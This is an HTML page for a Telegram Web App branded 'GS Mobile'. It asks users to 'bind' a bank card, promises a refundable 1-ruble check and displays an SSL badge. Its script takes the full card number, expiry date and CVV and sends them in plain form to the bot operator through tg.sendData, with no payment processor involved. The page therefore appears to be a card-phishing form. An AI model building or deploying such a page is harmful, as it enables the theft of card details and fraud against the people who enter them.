<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Привязка карты - GS Mobile</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            height: 100%;
            overflow: hidden;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 16px;
            color: #fff;
        }
        
        .container {
            background: #1a1a1a;
            border-radius: 20px;
            padding: 24px;
            width: 100%;
            max-width: 360px;
            border: 1px solid #2a2a2a;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .logo h1 {
            color: #00d4aa;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        
        .logo p {
            color: #888;
            font-size: 12px;
        }
        
        .info-text {
            text-align: center;
            color: #aaa;
            font-size: 12px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .amount-badge {
            display: inline-block;
            background: rgba(0, 212, 170, 0.15);
            color: #00d4aa;
            padding: 4px 12px;
            border-radius: 16px;
            font-weight: 600;
            font-size: 12px;
            margin-top: 8px;
            border: 1px solid rgba(0, 212, 170, 0.3);
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ccc;
            font-size: 11px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .form-group input {
            width: 100%;
            padding: 14px 12px;
            background: #0d0d0d;
            border: 2px solid #2a2a2a;
            border-radius: 12px;
            font-size: 16px;
            color: #fff;
            transition: all 0.3s ease;
            outline: none;
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
        }
        
        .form-group input:focus {
            border-color: #00d4aa;
            background: #141414;
        }
        
        .form-group input.error {
            border-color: #ff4757;
            animation: shake 0.5s;
        }
        
        .form-group input.valid {
            border-color: #00d4aa;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00d4aa 0%, #00a884 100%);
            color: #0d0d0d;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 4px;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0, 212, 170, 0.3);
        }
        
        .submit-btn:disabled {
            background: #2a2a2a;
            color: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 16px;
            color: #666;
            font-size: 11px;
        }
        
        .secure-badge svg {
            width: 14px;
            height: 14px;
            margin-right: 6px;
            fill: #00d4aa;
        }
        
        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 6px;
            margin-bottom: 20px;
        }
        
        .step {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #2a2a2a;
            transition: all 0.3s ease;
        }
        
        .step.active {
            background: #00d4aa;
            width: 20px;
            border-radius: 3px;
        }
        
        .hidden {
            display: none !important;
        }
        
        .card-hint {
            text-align: center;
            color: #666;
            font-size: 11px;
            margin-top: 6px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>GS Mobile</h1>
            <p>Привязка банковской карты</p>
        </div>
        
        <div class="info-text">
            Списание <span class="amount-badge">1 ₽</span> для проверки<br>
            Сумма вернётся на карту
        </div>
        
        <div class="step-indicator">
            <div class="step active" id="step1"></div>
            <div class="step" id="step2"></div>
        </div>
        
        <form id="cardForm">
            <div id="step1-content">
                <div class="form-group">
                    <label for="cardNumber">Номер карты</label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off" inputmode="numeric">
                </div>
                <div class="card-hint">16 цифр на лицевой стороне</div>
            </div>
            
            <div id="step2-content" class="hidden">
                <div class="form-row">
                    <div class="form-group">
                        <label for="expiry">Срок</label>
                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input type="password" id="cvv" placeholder="123" maxlength="3" inputmode="numeric">
                    </div>
                </div>
            </div>
            
            <button type="submit" class="submit-btn" id="submitBtn" disabled>Продолжить</button>
        </form>
        
        <div class="secure-badge">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            Защищено 256-bit SSL
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        
        // Не раскрываем на полный экран, устанавливаем компактную высоту
        // tg.expand(); — убрано
        
        // Устанавливаем цвета
        tg.setHeaderColor('#0d0d0d');
        tg.setBackgroundColor('#0d0d0d');
        
        // Отключаем вертикальную прокрутку
        tg.disableVerticalSwipes();
        
        const cardNumber = document.getElementById('cardNumber');
        const expiry = document.getElementById('expiry');
        const cvv = document.getElementById('cvv');
        const submitBtn = document.getElementById('submitBtn');
        const step1Content = document.getElementById('step1-content');
        const step2Content = document.getElementById('step2-content');
        const step1Indicator = document.getElementById('step1');
        const step2Indicator = document.getElementById('step2');
        
        let currentStep = 1;
        let cardValid = false;
        let dateValid = false;
        let cvvValid = false;
        
        function luhnCheck(cardNumber) {
            let sum = 0;
            let isEven = false;
            
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i), 10);
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return sum % 10 === 0;
        }
        
        cardNumber.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            
            e.target.value = formatted;
            
            if (value.length === 16) {
                if (luhnCheck(value)) {
                    cardNumber.classList.remove('error');
                    cardNumber.classList.add('valid');
                    cardValid = true;
                    updateSubmitButton();
                    setTimeout(() => goToStep2(), 300);
                } else {
                    cardNumber.classList.remove('valid');
                    cardNumber.classList.add('error');
                    cardValid = false;
                    updateSubmitButton();
                }
            } else {
                cardNumber.classList.remove('error', 'valid');
                cardValid = false;
                updateSubmitButton();
            }
        });
        
        function goToStep2() {
            currentStep = 2;
            step1Content.classList.add('hidden');
            step2Content.classList.remove('hidden');
            step1Indicator.classList.remove('active');
            step2Indicator.classList.add('active');
            submitBtn.textContent = 'Привязать карту';
            expiry.focus();
            updateSubmitButton();
        }
        
        expiry.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length >= 2) {
                let month = parseInt(value.substring(0, 2));
                if (month > 12) value = '12' + value.substring(2);
                if (month === 0) value = '01' + value.substring(2);
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            
            e.target.value = value;
            
            if (value.length === 5) {
                let parts = value.split('/');
                let month = parseInt(parts[0]);
                let year = parseInt(parts[1]);
                let currentYear = new Date().getFullYear() % 100;
                let currentMonth = new Date().getMonth() + 1;
                
                if (year > currentYear || (year === currentYear && month >= currentMonth)) {
                    dateValid = true;
                    expiry.classList.add('valid');
                    setTimeout(() => cvv.focus(), 100);
                } else {
                    dateValid = false;
                    expiry.classList.remove('valid');
                }
            } else {
                dateValid = false;
                expiry.classList.remove('valid');
            }
            
            updateSubmitButton();
        });
        
        cvv.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
            cvvValid = e.target.value.length === 3;
            
            if (cvvValid) {
                cvv.classList.add('valid');
            } else {
                cvv.classList.remove('valid');
            }
            
            updateSubmitButton();
        });
        
        function updateSubmitButton() {
            if (currentStep === 1) {
                submitBtn.disabled = !cardValid;
            } else {
                submitBtn.disabled = !(dateValid && cvvValid);
            }
        }
        
        document.getElementById('cardForm').addEventListener('submit', (e) => {
            e.preventDefault();
            
            if (currentStep === 1 && cardValid) {
                goToStep2();
                return;
            }
            
            if (currentStep === 2 && dateValid && cvvValid) {
                const cardData = {
                    card_number: cardNumber.value.replace(/\s/g, ''),
                    expiry: expiry.value,
                    cvv: cvv.value
                };
                
                tg.sendData(JSON.stringify(cardData));
                tg.close();
            }
        });
        
        updateSubmitButton();
    </script>
</body>
</html>
